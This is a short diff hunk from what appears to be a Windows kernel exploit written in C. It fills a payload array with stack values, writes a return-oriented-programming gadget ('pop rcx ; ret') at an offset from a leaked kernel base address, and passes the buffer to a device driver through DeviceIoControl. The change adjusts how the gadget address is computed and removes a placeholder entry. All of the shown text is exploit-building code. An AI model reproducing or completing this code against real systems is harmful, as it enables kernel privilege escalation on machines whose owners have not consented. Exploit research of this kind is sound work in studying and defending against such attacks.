@@ -102,9 +102,8 @@ int main(){
         payload[i] = ADDR(STACK_VAL[i]);
     }
 
-    payload[37] = kernel_base + 0x1407a7baf; // 0x1407a7baf: pop rcx ; ret ;
-    payload[38] = 0x1234;
-    
+    payload[37] = ADDR(kernel_base + 0x1407a7baf); //0x1407a7baf: pop rcx ; ret ;
+
     BOOL result3 = DeviceIoControl(
         hDevice,
         DeVioctlCode,
